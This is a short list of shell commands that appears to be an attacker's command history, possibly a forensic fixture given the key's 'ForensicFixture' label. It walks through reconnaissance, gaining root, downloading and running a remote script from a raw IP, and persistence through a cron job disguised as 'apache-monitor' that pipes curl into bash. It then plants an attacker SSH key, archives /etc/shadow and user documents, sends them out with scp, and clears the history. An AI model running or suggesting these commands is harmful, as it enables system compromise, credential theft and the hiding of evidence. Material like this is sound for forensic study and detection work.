id
uname -a
cat /etc/os-release
sudo -i
wget http://185.220.101.47/x.sh -O /tmp/x.sh
chmod +x /tmp/x.sh
/tmp/x.sh
echo '* * * * * root curl -fsSL http://185.220.101.47/x.sh | bash > /dev/null 2>&1' > /etc/cron.d/apache-monitor
cat ~/.ssh/id_rsa.pub
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKeyDoNotTrustThisKeyForensicFixture attacker@evil' >> /root/.ssh/authorized_keys
tar czf /tmp/loot.tgz /home/victim/Documents /etc/passwd /etc/shadow
scp /tmp/loot.tgz exfil@185.220.101.47:/data/
history -c
